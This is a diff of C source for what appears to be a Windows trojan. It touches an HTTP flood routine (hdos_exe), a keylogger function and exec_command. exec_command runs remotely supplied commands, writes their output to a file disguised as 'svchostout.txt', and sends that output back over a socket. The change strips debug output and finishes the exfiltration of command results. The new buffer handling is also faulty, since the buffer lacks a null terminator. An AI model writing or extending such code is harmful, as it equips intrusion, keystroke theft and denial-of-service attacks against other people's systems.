@@ -108,7 +108,6 @@ void hdos_exe(char *address){
 	send(sock_dos, "GET /\r\n", strlen("GET /\r\n"),0);
 	//Risposta
 	recv(sock_dos,server_ris,512,0);
-	printf("\n Server Ris: %s",server_ris);
 
 }
 
@@ -252,28 +251,28 @@ int get_keylog(){
 
 int exec_command(char *command, int sock)
 {
-    char *var=">svchostout.txt";
+    char *var=">svchostout.txt",*word,symbol;
     char *result = malloc(strlen(command)+strlen(var)+1);//+1 for the null-terminator
-
-    char symbol;
+    int i=0;
     strcpy(result, command);
     strcat(result, var);
-    printf("\n command: %s",result);
     system(result);
     FILE *fp = fopen("svchostout.txt", "r");
     if(fp != NULL)
     {
-        printf("I'm here");
-        while((symbol = getc(fp)) != EOF)
-        {
-            send(sock,"eieiei",strlen("eieiei"),0);
+    	fseek(fp, 0 , SEEK_END);
+	  	long fileSize = ftell(fp);
+		word=malloc(fileSize*sizeof(char));
+		fseek(fp, 0 , SEEK_SET);// needed for next read from beginning of file
+	    while((symbol = getc(fp)) != EOF){
+            word[i]=symbol;
+	  		i++;
         }
         fclose(fp);
+        send(sock, word, strlen(word),0);
     }
     else{return 0; }    //Error
-    //printf("%s",buf);
     system("del svchostout.txt");
-    //*bufs=buf;
     return 1; //success
 }
 
